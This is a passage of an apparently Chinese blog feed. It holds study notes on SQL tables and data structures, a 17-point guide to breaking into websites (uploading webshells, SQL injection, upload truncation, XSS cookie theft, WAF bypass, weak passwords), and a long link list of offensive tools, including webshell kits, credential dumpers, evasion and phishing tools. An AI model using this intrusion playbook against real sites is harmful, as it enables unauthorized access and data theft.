&lt;约束&gt;,</p><p>-- &lt;列名1&gt; &lt;数据类型&gt; &lt;约束&gt;,</p><p>-- …</p><p>-- &lt;表约束1&gt;,</p><p>-- &lt;表约束2&gt;,</p><p>-- …</p><p>-- )</p><p>-- 创建名为 Shohin 的表</p><p>CREATE TABLE Shohin</p><p>(</p><p>shohin_id CHAR(4) NOT NULL,</p><p>shohin_mei VARCHAR(100) NOT NULL,</p><p>shohin_bunrui VARCHAR(32) NOT NULL,</p><p>hanbai_tanka INTEGER ,</p><p>shiire_tanka INTEGER ,</p><p>torokubi DATE ,</p><p>PRIMARY KEY (shohin_id)</p><p>);</p><p> </p><p>3.命名规则：</p><p> </p><p>①只能使用半角英文字母、数字、下划线（_）作为数据库、表和列的名称；</p><p> </p><p>②规范要求命名以半角英文字符开头；</p><p> </p><p>③名称不能重复。</p><p> </p><p>4.数据类型的指定：声明该列的数据类型，是一种约束。</p><p> </p><p>5.数据类型介绍：</p><p> </p><p>①INTEGER：整型，意味不能存储小数；</p><p> </p><p>②CHAR：字符串型，如 CHAR（10）和 CHAR（100）中的括号表名该列可以存储的字符串的最大长度。它是“定长字符串”，如 CHAR(8) 表示在列中插入 ‘abc’ 时会自动保存成 ‘abc ‘（后面5个半角空格）的形式；</p><p> </p><p>③VARCHAR：字符串型，类似 CHAR，不同的是它是 “可变长字符串”，如 VARCHAR(8) 在插入 ‘abc’，保存的就是字符串 ‘abc’；</p><p> </p><p>④DATE：日期类型；</p><p> </p><p>… …</p><p> </p><p>6.约束：</p><p> </p><p>①非空约束：NULL 是空白（无记录）的意思的关键字，NOT NULL 表示必须输入的约束。</p><p> </p><p>②主键约束：主键是可以确定一行数据的列，一般通过它取特定行的数据，它是唯一的，不允许重复。</p><p> </p><p>… …</p><p> </p><p> </p><p>五、更新和删除表</p><p> </p><p>1.删除表</p><p> </p><p>-- 语法：DROP TABLE &lt;表名&gt;</p><p>DROP TABLE Shohin; – 删除名为 Shohin 的表</p><p>【注意】被删的表，无法恢复。</p><p> </p><p>2.更新表</p><p> </p><p>（1）添加列</p><p> </p><p>-- 语法：ALTER TABLE &lt;表名&gt; ADD &lt;列名&gt; &lt;类型&gt;;</p><p>ALTER TABLE Shohin ADD Shohin_mei_Kana VARCHAR(100); – 在 Shohin 中添加名为 Shohin_mei_Kana 类型为 VARCHAR(100) 的列</p><p>（2）删除列</p><p> </p><p>-- 语法：ALTER TABLE &lt;表名&gt; DROP COLUMN &lt;列名&gt;;</p><p>ALTER TABLE Shohin DROP COLUMN Shohin_mei_Kana; – 删除 Shohin 表中名为 Shohin_mei_Kana 的列</p><p>【注意】表定义变更后无法恢复。</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2.树和二叉树</title>
    <link href="/2019/08/06/2-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/index/"/>
    <url>/2019/08/06/2-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/index/</url>
    
    <content type="html"><![CDATA[<p>查找二叉树，又称二叉排序树（考试较多），一颗查找二叉树或者是一颗空树，或者满足以下递归条件：</p><p>（1）查找树的左右子树各是一颗查找树</p><p>（2） 若查找树的左子树非空，则其左子树上的各节点均小于根节点的值</p><p>（3）若查找树的右子树非空，则其右子树上的各节点值均大于根节点的值</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>1.线性表</title>
    <link href="/2019/08/03/1-%E7%BA%BF%E6%80%A7%E8%A1%A8/index/"/>
    <url>/2019/08/03/1-%E7%BA%BF%E6%80%A7%E8%A1%A8/index/</url>
    
    <content type="html"><![CDATA[<h2 id="主要考查知识点"><a href="#主要考查知识点" class="headerlink" title="主要考查知识点"></a><strong>主要考查知识点</strong></h2><p>1、线性表，</p><p>2、树和二叉树</p><p>3、图</p><p>4、排序算法</p><p>6、hash</p><p>6、查找算法</p><p> </p><h2 id="基本数据结构"><a href="#基本数据结构" class="headerlink" title="基本数据结构"></a><strong>基本数据结构</strong></h2><p><img src="images/%E6%8D%95%E8%8E%B7.png"></p><p> </p><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>按存储结构分类分为两类，顺序表以及链表</p><p>顺序表在内存中按顺序存储</p><p>链表是离散的，单独的一个个点，即物理上是离散的，但是逻辑上是一个整体</p><p> </p><h2 id="链表的类别："><a href="#链表的类别：" class="headerlink" title="链表的类别："></a>链表的类别：</h2><p> </p><p><strong>单链表</strong>:单向的，有两个域，前面的叫数据域，后面的叫指针域，存放的是指针，用于指向另一个节点，即下一个结点的地址，最后一个指针域为空，即表示后面没有后继结点</p><p><strong>循环链表</strong>：与单链表相似，但是最后一个的下一个结点是头结点，这样就构成了一个循环</p><p><strong>双链表</strong>：即不只一个指针，有两个指针域，前后各一个，从两个不同方向将链表连接起来，这样就构成了双向链表</p><p>双链表的灵活性会大于单链表，但是开支会更多，因为有两个指针域</p><p> </p><h2 id="链表的操作"><a href="#链表的操作" class="headerlink" title="链表的操作"></a>链表的操作</h2><p><strong>单链表的删除</strong>：将要删除的结点的前驱结点next域指向它的后继结点，并释放该结点</p><p><strong>单链表的结点插入</strong>，将要插入位置新建一个结点，将该节点指向要插入位置的下一结点，并将其前驱结点指向该结点</p><p> </p><p>双链表的结点删除</p><p>双链表的结点插入</p><h2 id="顺序表与链表的比较："><a href="#顺序表与链表的比较：" class="headerlink" title="顺序表与链表的比较："></a>顺序表与链表的比较：</h2><p>顺序表与链表的比较</p><p><img src="images/%E6%8D%95%E8%8E%B7-1.png"></p><p> </p><h2 id="栈："><a href="#栈：" class="headerlink" title="栈："></a>栈：</h2><p>并非实际存在，先进后出</p><h2 id="队列：先进先出"><a href="#队列：先进先出" class="headerlink" title="队列：先进先出"></a>队列：先进先出</h2><p>循环队列会形成一个环，每进入一个元素后，堆头指针不动，队尾指针向后移一位，当head=tail值队列可能为空或可能为满</p><p>解决方法：牺牲队列的最后一个空间不用来存数据，当尾指针指向最后一个空间时即队满，tail+1=head队满</p><p>mod运算是求余</p><p>做队列之类的题的时候画一个图再进行解答</p>]]></content>
    
    
    <categories>
      
      <category>1-数据结构与算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试的一般步骤</title>
    <link href="/2019/08/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/index/"/>
    <url>/2019/08/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/index/</url>
    
    <content type="html"><![CDATA[<p>仅供学习参考，严谨用于非法用途 </p><ol><li>第一件事就是扫目录，最好一下扫出个上传点，直接上传shell，有时候你花很久搞一个站，最后发现有个现成的上传点，而且很容易猜到，不过这种情况发生在asp居多！</li></ol><p>2.asp（aspx）+MSSQL先考虑注入，一般的注入都有DBowner权限可以直接写shell；如果写不了，或者web与数据库分离，那就猜数据，从后台下手了，后台可以上传或者改配置文件；</p><p>3.asp（aspx）+ACCESS拿shell一般只有3种方法，一是前台上传或者注入进后台上传；二是注入进后台改配置文件；三是注入进后台备份数据库或者暴库后知道是asp或者asa数据库于是直接写一句话；</p><p>4.php+MYSQL一般是注入进后台上传，偶尔运气好些权限够高可以注入select into outfile；然后包含，分本地与远程，远程包含在高版本php是不力挺的，于是想办法本地上传图片文件或者写到log里；然后php程序某某未公开的漏洞，运气好可以直接写shell。</p><p>5.jsp+MYSQL利用数据库拿权限方面基本同php，而且jsp的上传基本很少检查文件后缀，于是只要有注入点与后台，拿shell相当的容易。jsp+ORACLE的站我碰到的不多，碰到的也是猜出用户名与密码从后台下手的。</p><p>6.无论 神马大站，主站一般都很安全（不然早被人玩了），于是一般从二级域名下手，猜出主站的某些用户名与密码或者搞到主站的源代码，或者旁注得到同网段服务器后cain或arp。</p><p>7.一般的大站很少有用现成的CMS的，于是如果你有幸找到源码，那你就发了，注入漏洞啊，上传漏洞啊，写文件漏洞啊，都掌握在你手里。多看看那些大站新出来的测试分站点，那些站还在测试中，可以很轻松拿下。</p><p>8.上传有个文件名截断，这包括2个方面，一是00截断，二是长文件名截断（曾经利用这个搞下hw）；然后很多写文件的地方，都可以00，屡试不爽。上传别忘了.asp（当然.asa，.cer，.cdx都可以啦）目录的妙用。</p><p>9.php站无论windows还是linux，都有magic_quotes_gpc的问题，magic_quotes_gpc为on的时候，在server变量注入的时候还是可以select into outfile，一般情况下为on就别考虑写文件了，不过有这个权限别忘了读文件源码，因为load_file的参数是可以编码的。</p><p>10.猜路径或者文件在入侵中非常必要，猜不到路径的时候别忘了google（baidu太烂，google很全），于是你可以考虑看站点下的robot.txt或者robots.txt，会有惊喜。</p><p>11.工具的使用很重要，入侵之前用WVS扫扫会有助入侵；注入工具虽然很多，但不见得都好使，现在的软硬防火墙、防注入越来越厉害，那时候你就别偷懒，多手工有助你成长。</p><p>12.遇到过一流监控么，遇到其他防post的防火墙么，有时候一句话进去了都无法传大马，那时候，你先学学编码，学学变换绕过。</p><p>13.渗透一般的小站，记得查看这个小站的版权，找做这个站的公司，然后从这个公司做的其他站下手，得到源码再回头搞</p><p>14.旁注的思路永远不过时，遇到dbowner的注入，可以很舒服写shell到你需要的站，省得麻烦的提权了；运气不好，按部就班拿shell提权得到你所需。</p><p>15.永远别忘记社会工程学，利用社工把自己当成一个 神马也不会的人，从某某站长的qq，身份正，邮箱等等下手，也许有时可能会有意外；另外别忘记admin,admin；test,test；123456,123456这种简单的尝试，当然，你也可以暴力破解。</p><p>16.别忽视XSS，别忽视cookie，XSS可以偷cookie，更有若干妙用，自己学会领悟；cookie可以伪造登陆，cookie可以注入，cookie注入可以绕绝大多数的防火墙。</p><p>17.平时搞站多多搜集路径啊，源码啊，工具啊，充实自己的“武器”库；最好把自己的入侵步骤记录下来，或者事后反思下，我一般都是记在txt里，另外要做到举一反三。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞挖掘 | 渗透测试工具库</title>
    <link href="/2019/07/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93/index/"/>
    <url>/2019/07/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93/index/</url>
    
    <content type="html"><![CDATA[<p>警告，请勿用于非法用途，仅供学习使用！！！</p><p>漏洞及渗透练习平台：</p><p>WebGoat漏洞练习平台：</p><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：</p><p><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：</p><p><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：</p><p><a href="https://github.com/RandomStorm/DVWA">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：</p><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat：</p><p><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><p><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a></p><p>花式扫描器 ： Nmap端口扫描器：</p><p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></p><p><a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：</p><p><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:</p><p><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：</p><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：</p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：</p><p><a href="https://github.com/wilson9x1/fenghuangscanner/_v3">https://github.com/wilson9x1/fenghuangscanner\_v3</a></p><p>Fox-scan扫描器：</p><p><a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p><p>信息搜集工具 : 社工收集器：</p><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：</p><p><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：</p><p><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：</p><p><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：</p><p><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：</p><p><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具</p><p><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:</p><p><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p><p>WEB： webshell大合集：</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><p>免杀webshell生成脚本：</p><p><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a></p><p>渗透以及web攻击脚本：</p><p><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：</p><p><a href="https://github.com/rootphantomer/hacktoolsfor/_me">https://github.com/rootphantomer/hacktoolsfor\_me</a></p><p>XSS数据接收平台：</p><p><a href="https://github.com/firesunCN/BlueLotus/_XSSReceiver">https://github.com/firesunCN/BlueLotus\_XSSReceiver</a></p><p>XSS与CSRF工具：</p><p><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:</p><p><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：</p><p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：</p><p><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:</p><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：</p><p><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：</p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：</p><p><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：</p><p><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：</p><p><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：</p><p><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：</p><p><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：</p><p><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：</p><p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：</p><p><a href="https://github.com/misterch0c/firminator/_backend">https://github.com/misterch0c/firminator\_backend</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：</p><p><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：</p><p><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：</p><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：</p><p><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a></p><p><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：</p><p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：</p><p><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：</p><p><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：</p><p><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具</p><p><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：</p><p><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：</p><p><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：</p><p><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p><p>windows域渗透工具： 获取明文及哈希：</p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：</p><p><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:</p><p><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程: <a href="https://github.com/l3m0n/pentest/_study">https://github.com/l3m0n/pentest\_study</a></p><p>Fuzz: Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p><p>漏洞利用及攻击框架： msf框架：</p><p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：</p><p><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:</p><p><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a></p><p>漏洞POC&amp;EXP: ExploitDB官方git版本:</p><p><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：</p><p><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：</p><p><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权):</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><p><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:</p><p><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p><p>中间人攻击及钓鱼 中间人攻击框架:</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:</p><p><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><p><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:</p><p><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p><p>密码破解： 密码破解工具:</p><p><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:</p><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><p>二进制及代码分析工具： 二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a></p><p>系统扫描器</p><p><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a></p><p>rp:</p><p><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）: <a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:</p><p><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:</p><p><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:</p><p><a href="https://github.com/angr/angr">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:</p><p><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><p><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:</p><p><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p><p>EXP编写框架及工具： 二进制EXP编写工具:</p><p><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:</p><p><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:</p><p><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:</p><p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：</p><p><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p><p>隐写： 隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p><p>各类安全资料: data_hacking合集:</p><p><a href="https://github.com/ClickSecurity/data/_hacking">https://github.com/ClickSecurity/data\_hacking</a></p><p>mobile-security-wiki:</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:</p><p><a href="https://github.com/luyg24/IT/_security">https://github.com/luyg24/IT\_security</a></p><p>APT相关笔记:</p><p><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:</p><p><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:</p><p><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：</p><p><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：</p><p><a href="https://github.com/SecWiki/sec-chart/">https://github.com/SecWiki/sec-chart/</a> tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</p><p>各类CTF资源 近年ctf writeup大全:</p><p><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:</p><p><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a></p><p>ctf Resources:</p><p><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:</p><p><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p><p>各类编程资源: 大礼包（什么都有）:</p><p><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:</p><p><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:</p><p><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:</p><p><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:</p><p><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><p>Python： python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:</p><p><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:</p><p><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：</p><p><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:</p><p><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><p><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:</p><p><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:</p><p><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:</p><p><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p><p>福利：</p><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:</p><p><a 